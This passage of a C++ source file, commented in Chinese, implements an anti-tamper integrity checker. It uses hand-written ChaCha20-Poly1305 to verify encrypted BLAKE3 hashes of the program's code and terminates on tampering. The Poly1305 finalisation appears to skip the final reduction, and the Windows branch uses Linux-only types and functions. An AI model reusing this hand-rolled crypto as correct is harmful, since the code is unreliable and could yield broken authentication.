    uint32_t x[16];
    for (int i = 0; i < 16; ++i)
      x[i] = state[i];

    for (int i = 0; i < 10; ++i) { // 10 double rounds
      QUARTER_ROUND(x[0], x[4], x[8], x[12]);
      QUARTER_ROUND(x[1], x[5], x[9], x[13]);
      QUARTER_ROUND(x[2], x[6], x[10], x[14]);
      QUARTER_ROUND(x[3], x[7], x[11], x[15]);
      QUARTER_ROUND(x[0], x[5], x[10], x[15]);
      QUARTER_ROUND(x[1], x[6], x[11], x[12]);
      QUARTER_ROUND(x[2], x[7], x[8], x[13]);
      QUARTER_ROUND(x[3], x[4], x[9], x[14]);
    }

    memcpy(out, &x[0], 16);
    memcpy(out + 16, &x[12], 16);
  }

  void NO_IC_INSTRUMENT chacha20_crypt(const uint8_t key[32],
                                       const uint8_t nonce[12],
                                       uint32_t counter, const uint8_t *in,
                                       uint8_t *out, size_t len) {
    uint32_t state[16];
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;

    // 使用 memcpy 以避免严格别名问题。
    // 这假定主机是小端架构，这也是ChaCha20算法本身的要求。
    memcpy(&state[4], key, 32);
    state[12] = counter;
    memcpy(&state[13], nonce, 12);

    uint32_t keystream_block[16]; // 使用正确对齐的缓冲区以避免严格别名问题
    while (len > 0) {
      chacha20_block(state, keystream_block);
      size_t n = (len < 64) ? len : 64;
      // 从对齐的uint32_t缓冲区转换为uint8_t指针是安全的
      const uint8_t *block_bytes = (const uint8_t *)keystream_block;
      for (size_t i = 0; i < n; ++i)
        out[i] = in[i] ^ block_bytes[i];
      in += n;
      out += n;
      len -= n;
      state[12]++;
    }
  }

  // Internal Poly1305 state and core functions
  void NO_IC_INSTRUMENT poly1305_mac(const uint8_t *msg, size_t len,
                                     const uint8_t key[32], uint8_t tag[16]) {
    // Correct implementation of Poly1305 based on RFC 8439 using a 26-bit limb
    // representation.

    // 1. Load and clamp `r` from the first 16 bytes of the key.
    uint8_t r_bytes[16];
    memcpy(r_bytes, key, 16);

    // Apply clamping masks as per RFC 8439.
    r_bytes[3] &= 15;
    r_bytes[7] &= 15;
    r_bytes[11] &= 15;
    r_bytes[15] &= 15;
    r_bytes[4] &= 252;
    r_bytes[8] &= 252;
    r_bytes[12] &= 252;

    uint32_t r_le[4];
    memcpy(r_le, r_bytes, 16);

    // Load clamped key into 26-bit limbs.
    uint32_t r[5];
    r[0] = (r_le[0]) & 0x03ffffff;
    r[1] = (r_le[0] >> 26 | r_le[1] << 6) & 0x03ffffff;
    r[2] = (r_le[1] >> 20 | r_le[2] << 12) & 0x03ffffff;
    r[3] = (r_le[2] >> 14 | r_le[3] << 18) & 0x03ffffff;
    r[4] = (r_le[3] >> 8);

    // 2. Initialize accumulator `h` and other variables.
    uint32_t h[5] = {0};
    uint64_t d[5];
    uint64_t c;

    // 3. Process message in 16-byte blocks.
    while (len > 0) {
      size_t n = (len < 16) ? len : 16;
      uint8_t block[17] = {0}; // Zero-initialize to prevent reading garbage.
      memcpy(block, msg, n);
      block[n] = 1; // Pad with 1 byte.

      // Load message block and add to accumulator `h`.
      uint32_t t[4];
      memcpy(t, block, 16);
      h[0] += (t[0]) & 0x03ffffff;
      h[1] += (t[0] >> 26 | t[1] << 6) & 0x03ffffff;
      h[2] += (t[1] >> 20 | t[2] << 12) & 0x03ffffff;
      h[3] += (t[2] >> 14 | t[3] << 18) & 0x03ffffff;
      h[4] += (t[3] >> 8) | ((uint32_t)block[16] << 24);

      // Field multiplication: h = (h * r) % p
      for (int i = 0; i < 5; ++i) {
        d[i] = 0;
        for (int j = 0; j < 5; ++j) {
          if (i >= j) {
            d[i] += (uint64_t)h[j] * r[i - j];
          } else {
            d[i] += (uint64_t)h[j] * r[5 + i - j] * 5;
          }
        }
      }

      // Reduce d (carry propagation).
      c = 0;
      for (int i = 0; i < 5; ++i) {
        d[i] += c;
        c = d[i] >> 26;
        h[i] = d[i] & 0x03ffffff;
      }
      h[0] += c * 5;
      c = h[0] >> 26;
      h[0] &= 0x03ffffff;
      h[1] += c;

      msg += n;
      len -= n;
    }

    // 4. Finalization.
    // Final reduction of h.
    c = h[1] >> 26;
    h[1] &= 0x03ffffff;
    h[2] += c;
    c = h[2] >> 26;
    h[2] &= 0x03ffffff;
    h[3] += c;
    c = h[3] >> 26;
    h[3] &= 0x03ffffff;
    h[4] += c;
    c = h[4] >> 26;
    h[4] &= 0x03ffffff;
    h[0] += c * 5;
    c = h[0] >> 26;
    h[0] &= 0x03ffffff;
    h[1] += c;

    // Add `s` (the second 16 bytes of the key).
    uint32_t s_le[4];
    memcpy(s_le, key + 16, 16);
    h[0] += (s_le[0]) & 0x03ffffff;
    h[1] += (s_le[0] >> 26 | s_le[1] << 6) & 0x03ffffff;
    h[2] += (s_le[1] >> 20 | s_le[2] << 12) & 0x03ffffff;
    h[3] += (s_le[2] >> 14 | s_le[3] << 18) & 0x03ffffff;
    h[4] += (s_le[3] >> 8);

    // Final carry after adding `s`.
    c = h[0] >> 26;
    h[0] &= 0x03ffffff;
    h[1] += c;
    c = h[1] >> 26;
    h[1] &= 0x03ffffff;
    h[2] += c;
    c = h[2] >> 26;
    h[2] &= 0x03ffffff;
    h[3] += c;
    c = h[3] >> 26;
    h[3] &= 0x03ffffff;
    h[4] += c;

    // Serialize the accumulator `h` into the 16-byte tag.
    uint32_t tag_out[4];
    tag_out[0] = h[0] | (h[1] << 26);
    tag_out[1] = (h[1] >> 6) | (h[2] << 20);
    tag_out[2] = (h[2] >> 12) | (h[3] << 14);
    tag_out[3] = (h[3] >> 18) | (h[4] << 8);
    memcpy(tag, tag_out, 16);
  }

  } // anonymous namespace

  // Implementation of the header-declared functions
  void NO_IC_INSTRUMENT xchacha20_poly1305_encrypt(
      const std::vector<uint8_t> &key, const std::vector<uint8_t> &nonce,
      const std::vector<uint8_t> &aad, const std::vector<uint8_t> &plaintext,
      std::vector<uint8_t> &ciphertext, std::vector<uint8_t> &tag) {
    ciphertext.resize(plaintext.size());
    tag.resize(16);

    uint8_t subkey[32];
    uint8_t chacha_nonce[12];
    // 调用新实现的 setup 函数
    xchacha20_setup(key.data(), nonce.data(), subkey, chacha_nonce);

    uint8_t poly_key[32];
    // 调用新的 Poly1305 密钥生成函数
    generate_poly1305_key(subkey, chacha_nonce, poly_key);

    // 使用子密钥和内部 nonce 进行加密
    chacha20_crypt(subkey, chacha_nonce, 1, plaintext.data(), ciphertext.data(),
                   plaintext.size());

    // 根据 RFC 8439 Section 2.8 构造 Poly1305 输入 (此部分逻辑正确，保持不变)
    size_t aad_len = aad.size();
    size_t ct_len = ciphertext.size();
    size_t aad_pad_len = (16 - (aad_len % 16)) % 16;
    size_t ct_pad_len = (16 - (ct_len % 16)) % 16;
    size_t mac_data_len = aad_len + aad_pad_len + ct_len + ct_pad_len + 16;
    std::vector<uint8_t> mac_data(mac_data_len, 0);

    // 1. 复制 AAD
    memcpy(mac_data.data(), aad.data(), aad_len);
    // 2. 复制密文
    memcpy(mac_data.data() + aad_len + aad_pad_len, ciphertext.data(), ct_len);

    // 3. 复制 AAD 长度和密文长度 (64位小端整数)
    uint64_t aad_len_le = aad_len;
    uint64_t ct_len_le = ct_len;
    memcpy(mac_data.data() + aad_len + aad_pad_len + ct_len + ct_pad_len,
           &aad_len_le, 8);
    memcpy(mac_data.data() + aad_len + aad_pad_len + ct_len + ct_pad_len + 8,
           &ct_len_le, 8);

    poly1305_mac(mac_data.data(), mac_data.size(), poly_key, tag.data());
  }

  extern "C" int NO_IC_INSTRUMENT __aead_xchacha20_poly1305_decrypt(
      uint8_t *ciphertext, size_t text_len, const uint8_t *aad, size_t aad_len,
      const uint8_t *key, const uint8_t *nonce, const uint8_t *tag) {

    uint8_t subkey[32];
    uint8_t chacha_nonce[12];
    // 调用新实现的 setup 函数
    xchacha20_setup(key, nonce, subkey, chacha_nonce);

    uint8_t poly_key[32];
    // 调用新的 Poly1305 密钥生成函数
    generate_poly1305_key(subkey, chacha_nonce, poly_key);

    uint8_t calculated_tag[16];

    // 构造 Poly1305 输入以验证 MAC (此部分逻辑正确，保持不变)
    size_t aad_pad_len = (16 - (aad_len % 16)) % 16;
    size_t ct_pad_len = (16 - (text_len % 16)) % 16;
    size_t mac_data_len = aad_len + aad_pad_len + text_len + ct_pad_len + 16;
    uint8_t *mac_data = (uint8_t *)malloc(mac_data_len);
    if (!mac_data) {
      stack_overflow((uintptr_t)secure_terminate);
      secure_terminate();
    }

    // 1. 复制 AAD 和填充
    memcpy(mac_data, aad, aad_len);
    memset(mac_data + aad_len, 0, aad_pad_len);
    // 2. 复制密文和填充
    memcpy(mac_data + aad_len + aad_pad_len, ciphertext, text_len);
    memset(mac_data + aad_len + aad_pad_len + text_len, 0, ct_pad_len);

    // 3. 复制 AAD 长度和密文长度
    uint64_t aad_len_le = aad_len;
    uint64_t ct_len_le = text_len;
    memcpy(mac_data + aad_len + aad_pad_len + text_len + ct_pad_len,
           &aad_len_le, 8);
    memcpy(mac_data + aad_len + aad_pad_len + text_len + ct_pad_len + 8,
           &ct_len_le, 8);

    poly1305_mac(mac_data, mac_data_len, poly_key, calculated_tag);
    free(mac_data);

    // 恒定时间比较标签
    int diff = 0;
    for (int i = 0; i < 16; ++i) {
      diff |= tag[i] ^ calculated_tag[i];
    }

    if (diff != 0) {
      // 认证失败！检测到篡改。
      stack_overflow((uintptr_t)secure_terminate);
      secure_terminate();
    }

    // 认证成功，使用子密钥和内部 nonce 原地解密
    chacha20_crypt(subkey, chacha_nonce, 1, ciphertext, ciphertext, text_len);
    return 1;
  }

  extern "C" [[noreturn]] void NO_IC_INSTRUMENT __tsx_tamper_handler() {
    // 当事务中止时，表明可能存在调试、Hook 或其他形式的篡改。
    secure_terminate();
  }

  // --- 1. 定义 LLD 插件填充的数据结构和占位符 ---

  // 在文件顶部，更新结构体定义

  // 加密哈希的结构体
  struct encrypted_hash {
    uint8_t ciphertext[BLAKE3_OUT_LEN]; // 加密后的哈希
    uint8_t nonce[24];                  // XChaCha20 nonce (24字节)
    uint8_t tag[16];                    // Poly1305 认证标签
  };

  // 更新函数信息结构体，使用加密的哈希
  struct protected_func_info {
    const void *addr;        // 函数在内存中的起始地址
    uint64_t size;           // 函数的大小（字节）
    encrypted_hash enc_hash; // 加密的函数哈希
  };

  // 声明由 LLD 插件填充的外部全局变量
  extern "C" {
  // 为这些符号提供弱定义，避免链接时未定义符号错误
  // 这些符号会在运行时被 LLVM Pass 创建的实际符号覆盖

  __attribute__((weak)) encrypted_hash __text_section_encrypted_hash;

  __attribute__((
      weak)) protected_func_info __protected_funcs_info_table[1] = {};

  __attribute__((weak)) uint8_t __integrity_check_key[32] = {};
  }

  // --- 2. 静态完整性校验实现 ---
static bool NO_IC_INSTRUMENT
calculate_text_section_aad(uint8_t *aad_buffer, size_t buffer_len) {
  if (buffer_len < sizeof(uint64_t))
    return false;

  long file_size = 0;
  uint8_t the_byte_val = 0;

#ifdef _WIN32
  char self_path[1024];
  if (GetModuleFileName(NULL, self_path, sizeof(self_path)) == 0) {
#ifdef IC_DEBUG
    fprintf(stderr,
            "[IC-RUNTIME] !! Failed to get executable path for AAD "
            "calculation.\n");
#endif
    return false;
  }

  FILE *f = fopen(self_path, "rb");
  if (!f) {
#ifdef IC_DEBUG
    fprintf(stderr,
            "[IC-RUNTIME] !! Failed to open executable file at '%s' for AAD "
            "calculation.\n",
            self_path);
#endif
    return false;
  }

  fseek(f, 0, SEEK_END);
  file_size = ftell(f);
  fseek(f, 0, SEEK_SET);

  if (file_size <= 0) {
    fclose(f);
    return false;
  }

  // 优化: 将文件前半部分读入内存，避免循环 fseek
  long mid_index = file_size / 2;
  size_t read_size = mid_index + 1;
  char *file_buffer = (char *)malloc(read_size);
  if (!file_buffer) {
    fclose(f);
    return false;
  }

  size_t bytes_read = fread(file_buffer, 1, read_size, f);
  fclose(f);

  if (bytes_read != read_size) {
    free(file_buffer);
    return false;
  }

  // 在内存中向后搜索
  for (long i = mid_index; i >= 0; --i) {
    if (file_buffer[i] != 0) {
      the_byte_val = (uint8_t)file_buffer[i];
      break;
    }
  }
  free(file_buffer);

#else // Linux - 更高效的实现
  // 1. 直接打开 /proc/self/exe 获取文件描述符
  int fd = open("/proc/self/exe", O_RDONLY);
  if (fd < 0) {
#ifdef IC_DEBUG
    fprintf(stderr,
            "[IC-RUNTIME] !! Failed to open /proc/self/exe for AAD "
            "calculation.\n");
#endif
    return false;
  }

  // 2. 使用 fstat 高效获取文件大小
  struct stat st;
  if (fstat(fd, &st) != 0) {
    close(fd);
#ifdef IC_DEBUG
    fprintf(stderr, "[IC-RUNTIME] !! fstat failed for AAD calculation.\n");
#endif
    return false;
  }
  file_size = st.st_size;

  if (file_size <= 0) {
    close(fd);
    return false;
  }

  // 3. 一次性将文件前半部分读入内存
  long mid_index = file_size / 2;
  size_t read_size = mid_index + 1;
  char *file_buffer = (char *)malloc(read_size);
  if (!file_buffer) {
    close(fd);
    return false; // 内存不足
  }

  ssize_t bytes_read = read(fd, file_buffer, read_size);
  close(fd); // 文件操作完成，立即关闭

  if (bytes_read != (ssize_t)read_size) {
#ifdef IC_DEBUG
    fprintf(stderr,
            "[IC-RUNTIME] !! Failed to read first half of executable for AAD.\n");
#endif
    free(file_buffer);
    return false;
  }

  // 4. 在内存中快速搜索
  for (long i = mid_index; i >= 0; --i) {
    if (file_buffer[i] != 0) {
      the_byte_val = (uint8_t)file_buffer[i];
      break;
    }
  }
  free(file_buffer);
#endif

  // 对两个平台通用的 AAD 计算和收尾工作
  uint64_t aad_value = (uint64_t)the_byte_val * file_size;
#ifdef IC_DEBUG
  fprintf(stderr,
          "[IC-RUNTIME] Calculated AAD for .text: byte=0x%x, size=%ld, "
          "aad_val=%llu\n",
          the_byte_val, file_size, (unsigned long long)aad_value);
#endif

  memcpy(aad_buffer, &aad_value, sizeof(uint64_t));
  return true;
}
  // 在完整性校验实现之前添加这个辅助函数

  // 解密并验证哈希的辅助函数
  static bool NO_IC_INSTRUMENT decrypt_and_verify_hash(
      const encrypted_hash &enc_hash, const uint8_t *calculated_hash,
      size_t hash_len, const uint8_t *aad, size_t aad_len) {
#ifdef IC_DEBUG
    fprintf(stderr, "[IC-RUNTIME] decrypt_and_verify_hash called.\n");
#endif
    // 1. 使用 XChaCha20-Poly1305 解密存储的哈希
    uint8_t decrypted_hash[BLAKE3_OUT_LEN];
    memcpy(decrypted_hash, enc_hash.ciphertext, BLAKE3_OUT_LEN);

    // --- Pass the AAD to the decryption function ---
    // 调用解密函数
    int decrypt_result = __aead_xchacha20_poly1305_decrypt(
        decrypted_hash,        // 输入：密文，输出：明文
        BLAKE3_OUT_LEN,        // 数据长度
        aad,                   // AAD
        aad_len,               // AAD 长度
        __integrity_check_key, // 解密密钥
        enc_hash.nonce,        // nonce
        enc_hash.tag           // 认证标签
    );

    // 如果解密失败（认证失败），说明哈希或 AAD 被篡改
    if (decrypt_result != 1) {
#ifdef IC_DEBUG
      fprintf(stderr, "[IC-RUNTIME] !! Decryption/Authentication FAILED.\n");
      print_bytes("  - Key:      ", __integrity_check_key, 32);
      print_bytes("  - Nonce:    ", enc_hash.nonce, 24);
      print_bytes("  - Tag:      ", enc_hash.tag, 16);
      print_bytes("  - Cipher:   ", enc_hash.ciphertext, BLAKE3_OUT_LEN);
#endif
      return false;
    }

#ifdef IC_DEBUG
    fprintf(stderr, "[IC-RUNTIME] Decryption/Authentication successful.\n");
    print_bytes("  - Decrypted Hash: ", decrypted_hash, BLAKE3_OUT_LEN);
    print_bytes("  - Calculated Hash:", calculated_hash, hash_len);
#endif

    // 2. 解密成功，现在比较哈希
    // 使用恒定时间比较防止时序攻击
    int diff = 0;
    for (size_t i = 0; i < hash_len && i < BLAKE3_OUT_LEN; ++i) {
      diff |= calculated_hash[i] ^ decrypted_hash[i];
    }

#ifdef IC_DEBUG
    if (diff != 0) {
      fprintf(stderr, "[IC-RUNTIME] !! HASH MISMATCH.\n");
    } else {
      fprintf(stderr, "[IC-RUNTIME] Hash match OK.\n");
    }
#endif

    return (diff == 0);
  }

#ifdef _WIN32
static int NO_IC_INSTRUMENT base_addr_callback(struct dl_phdr_info *info,
                                               size_t size, void *data) {
  // 回调的第一个对象就是主程序本身。我们捕获它的基地址并停止迭代。
  *(uintptr_t *)data = info->dlpi_addr;
  return 1; // 返回非零值以停止迭代
}
  // Windows (PE) 平台的 .text 节区查找与校验
  static void NO_IC_INSTRUMENT verify_text_section_integrity_windows() {
    // 获取当前模块（即可执行文件自身）的基地址
    HMODULE base_addr = GetModuleHandle(NULL);
    if (!base_addr) {
      secure_terminate();
    }

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS nt_headers =
        (PIMAGE_NT_HEADERS)((uint8_t *)base_addr + dos_header->e_lfanew);

    // 定位到节区头表
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);

    // 遍历所有节区，寻找 .text 节区
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections;
         ++i, ++section_header) {
      // 使用 strncmp 比较节区名，".text" 是标准名称
      if (strncmp((const char *)section_header->Name, ".text",
                  IMAGE_SIZEOF_SHORT_NAME) == 0) {
        const void *text_section_start =
            (uint8_t *)base_addr + section_header->VirtualAddress;
        size_t text_section_size = section_header->Misc.VirtualSize;

        // 计算当前 .text 节区的哈希
        uint8_t calculated_hash[BLAKE3_OUT_LEN];
        blake3_hasher hasher;
        blake3_hasher_init(&hasher);
        blake3_hasher_update(&hasher, text_section_start, text_section_size);
        blake3_hasher_finalize(&hasher, calculated_hash, BLAKE3_OUT_LEN);

        // --- MODIFIED: Calculate AAD from file content and use it for verification ---
        uint8_t aad_data[sizeof(uint64_t)];
        if (!calculate_text_section_aad(aad_data, sizeof(aad_data))) {
          secure_terminate();
        }
        if (!decrypt_and_verify_hash(__text_section_encrypted_hash,
                                     calculated_hash, BLAKE3_OUT_LEN, aad_data,
                                     sizeof(aad_data))) {
          secure_terminate();
        }
        return; // 找到并校验完毕，成功返回
      }
    }

    // 如果循环结束仍未找到 .text 节区，说明存在异常
    secure_terminate();
  }

#else // Linux (ELF) 平台的实现

// 新增：用于获取程序基地址的回调函数
static int NO_IC_INSTRUMENT base_addr_callback(struct dl_phdr_info *info,
                                               size_t size, void *data) {
  // 回调的第一个对象就是主程序本身。我们捕获它的基地址并停止迭代。
  *(uintptr_t *)data = info->dlpi_addr;
  return 1; // 返回非零值以停止迭代
}

// 新增：获取并缓存程序基地址的辅助函数
static uintptr_t NO_IC_INSTRUMENT get_program_base_address() {
  // 使用静态变量缓存基地址，避免重复计算
  static uintptr_t base_addr = 0;
  if (base_addr == 0) {
    dl_iterate_phdr(base_addr_callback, &base_addr);
  }
  return base_addr;
}

// dl_iterate_phdr 的回调函数，用于处理每个加载的共享对象
static int NO_IC_INSTRUMENT phdr_callback(struct dl_phdr_info *info,
                                          size_t size, void *data) {
  // 我们只关心主程序，它的基地址通常是0（对于非PIE）或由加载器确定。
  // 回调的第一个对象就是主程序本身。
  const ElfW(Phdr) *phdr = info->dlpi_phdr;
  for (int i = 0; i < info->dlpi_phnum; ++i, ++phdr) {
    // 我们寻找类型为 PT_LOAD (可加载) 且具有执行权限 (PF_X) 的段，
    // 这通常是 .text 段。
    if (phdr->p_type == PT_LOAD && (phdr->p_flags & PF_X)) {
      // 使用新的辅助函数获取基地址
      uintptr_t base_addr = get_program_base_address();
      const void *text_section_start = (void *)(base_addr + phdr->p_vaddr);
      size_t text_section_size = phdr->p_memsz;

      // 计算当前 .text 节区的哈希
      uint8_t calculated_hash[BLAKE3_OUT_LEN];
      blake3_hasher hasher;
      blake3_hasher_init(&hasher);
      blake3_hasher_update(&hasher, text_section_start, text_section_size);
      blake3_hasher_finalize(&hasher, calculated_hash, BLAKE3_OUT_LEN);

      // --- MODIFIED: Calculate AAD from file content and use it for verification ---
      uint8_t aad_data[sizeof(uint64_t)];
      if (!calculate_text_section_aad(aad_data, sizeof(aad_data))) {
        secure_terminate();
      }
      if (!decrypt_and_verify_hash(__text_section_encrypted_hash,
                                   calculated_hash, BLAKE3_OUT_LEN, aad_data,
                                   sizeof(aad_data))) {
        secure_terminate();
      }

      // 标记为已找到并处理
      *(bool *)data = true;
      return 1; // 返回非零值以停止迭代
    }
  }
  return 0; // 继续迭代
}

static void NO_IC_INSTRUMENT verify_text_section_integrity_linux() {
  bool found = false;
  dl_iterate_phdr(phdr_callback, &found);

  // 如果回调结束后仍未找到 .text 段，说明存在异常
  if (!found) {
    secure_terminate();
  }
}
#endif

  // 静态校验的 C 接口函数，由全局构造函数调用
  extern "C" void NO_IC_INSTRUMENT __verify_self_integrity() {
#ifdef _WIN32
    verify_text_section_integrity_windows();
#else
  verify_text_section_integrity_linux();
#endif
  }

  // --- 3. 动态完整性校验实现 ---

  // 动态校验的 C 接口函数，由 Pass 注入到受保护函数中
  extern "C" void NO_IC_INSTRUMENT __verify_memory_integrity(
    const void *function_addr) {
#ifdef IC_DEBUG
  // --- Correctly name the incoming parameter for clarity ---
  const void *real_function_addr = function_addr;
  fprintf(stderr, "\n[IC-RUNTIME] __verify_memory_integrity(real_addr: %p)\n",
          real_function_addr);
#else
  // In non-debug mode, just use the original name to avoid unused variable warnings
  const void *real_function_addr = function_addr;
#endif

  // --- 核心修复：处理 ASLR ---
  // 1. 获取程序在内存中的实际基地址
  uintptr_t base_addr = get_program_base_address();
  // 2. 计算要查找的相对地址 (RVA)
  uintptr_t relative_addr_to_find = (uintptr_t)real_function_addr - base_addr;

#ifdef IC_DEBUG
  fprintf(stderr, "  - Program Base Addr: %p\n", (void *)base_addr);
  fprintf(stderr, "  - Calculated Relative Addr for Lookup: 0x%lx\n", relative_addr_to_find);
#endif

  // --- NEW: 遍历表以查找匹配的条目 ---
  for (int i = 0; /* no condition */; ++i) {

if(i<0)
{
  #ifdef IC_DEBUG
  fprintf(stderr,
          "[IC-RUNTIME] !! ERROR: Negative index %d encountered in "
          "protected functions info table. This is a serious error.\n",
          i);
  #endif
  secure_terminate();
}

    const protected_func_info &info = __protected_funcs_info_table[i];

    // 检查由 encheck.py 添加的、作为表结尾标记的空条目
    if (info.addr == nullptr && info.size == 0) {
#ifdef IC_DEBUG
      fprintf(stderr,
              "[IC-RUNTIME] !! ERROR: Function with relative address 0x%lx not "
              "found in the protection table. Reached terminator at index %d.\n",
              relative_addr_to_find, i);
#endif
      secure_terminate(); // 函数未在保护表中找到，这是严重错误
    }

    // --- Compare the calculated relative address with the one from the table ---
    if ((uintptr_t)info.addr == relative_addr_to_find) {
      // 找到了！现在执行哈希校验。
#ifdef IC_DEBUG
      fprintf(stderr,
              "  - Found matching entry at index %d. Stored RVA: %p, Size: "
              "%lu\n",
              i, info.addr, info.size);
#endif
      // 计算当前函数的哈希
      uint8_t calculated_hash[BLAKE3_OUT_LEN];
      blake3_hasher hasher;
      blake3_hasher_init(&hasher);
      // --- Use the real, absolute address for hashing ---
      blake3_hasher_update(&hasher, real_function_addr, info.size);
      blake3_hasher_finalize(&hasher, calculated_hash, BLAKE3_OUT_LEN);

      // --- Construct AAD from the info in the table and verify ---
      uint8_t aad_data[16]; // 8 bytes for addr, 8 bytes for size
      memcpy(aad_data, &info.addr, 8);
      memcpy(aad_data + 8, &info.size, 8);

      if (!decrypt_and_verify_hash(info.enc_hash, calculated_hash,
                                   BLAKE3_OUT_LEN, aad_data, sizeof(aad_data))) {
#ifdef IC_DEBUG
        fprintf(stderr,
                "[IC-RUNTIME] !! Verification FAILED for function at real "
                "addr %p.\n",
                real_function_addr);
#endif
        secure_terminate();
      }
#ifdef IC_DEBUG
      fprintf(stderr,
              "[IC-RUNTIME] Verification successful for function at real "
              "addr %p.\n",
              real_function_addr);
#endif
      // 校验成功，可以停止搜索并返回
      return;
    }
  }
}